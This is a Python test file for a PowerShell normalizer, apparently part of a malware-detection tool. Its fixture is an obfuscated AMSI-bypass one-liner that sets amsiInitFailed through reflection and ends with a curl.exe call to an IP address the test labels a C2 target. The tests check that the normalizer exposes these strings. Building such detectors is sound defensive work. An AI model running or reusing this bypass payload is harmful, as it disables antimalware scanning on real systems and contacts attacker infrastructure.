"""Feb 2026 v1.3.1 · ps_normalize bareword-coercion regression.

The AMSI-bypass tradecraft uses UNQUOTED bareword identifiers inside
`+` concat and `-f` format chains to hide `AmsiUtils`, `amsiInitFailed`,
`NonPublic,Static`. Verify the normalizer resolves all three fragments.
"""
from ps_normalize import normalize_if_powershell


AMSI_BYPASS_OBFUSCATED = (
    "S`eT-It`em ( VaRIA + ((blE:1)+'q2')  + ('uZ'+'x') ) "
    "( [TYpE](  \"{1}{0}\"-F'F','rE' ) )  ;    "
    "(   Get-varI`A`BLE ( '1Q'+'2U')  +'zX'  ) -VaL )."
    "\"A`ss`Embly\".\"GET`TY`Pe\"((  \"{6}{3}{1}{4}{2}{0}{5}\" "
    "-f('Uti'+'l'),'A',('Am'+'si'),((.Man)+agement.),('u'+'to'+(mation.)),'s',((Syst)+'em') ) )."
    "\"g`etf`iElD\"(  ( \"{0}{2}{1}\" -f('a'+'msi'),'d',('I'+(nitF)+(aile))  ),"
    "(  \"{2}{4}{0}{1}{3}\" -f ('S'+'tat'),'i',('Non'+(\"{1}{0}\" -f'ubl','P')+'i'),'c','c,' ))."
    "\"sE`T`VaLUE\"(  ${n`ULl},${t`RuE} ) curl.exe https://10.2.27.30"
)


def test_amsi_bypass_resolves_key_strings():
    cleaned, applied = normalize_if_powershell(AMSI_BYPASS_OBFUSCATED)
    assert applied, "normalizer should recognise this as PowerShell"
    # The three AMSI-bypass tell-tales MUST surface in cleaned output.
    assert "'System.Management.Automation.AmsiUtils'" in cleaned, cleaned
    assert "'amsiInitFailed'" in cleaned, cleaned
    assert "'NonPublic,Static'" in cleaned, cleaned
    # Backticks in idents fully stripped
    assert "S`eT-It`em" not in cleaned
    assert "GET`TY`Pe" not in cleaned
    # `[TYpE]("{1}{0}"-F'F','rE')` → `[TYpE]'rEF'`
    assert "'rEF'" in cleaned
    # C2 target must remain readable
    assert "curl.exe https://10.2.27.30" in cleaned


def test_amsi_bypass_shortens_significantly():
    cleaned, _ = normalize_if_powershell(AMSI_BYPASS_OBFUSCATED)
    # After collapsing concats + format ops + barewords we should shrink >30%.
    assert len(cleaned) < len(AMSI_BYPASS_OBFUSCATED) * 0.75


def test_normalizer_idempotent():
    """Running twice must not change output — no infinite loops."""
    once, _ = normalize_if_powershell(AMSI_BYPASS_OBFUSCATED)
    twice, _ = normalize_if_powershell(once)
    assert once == twice
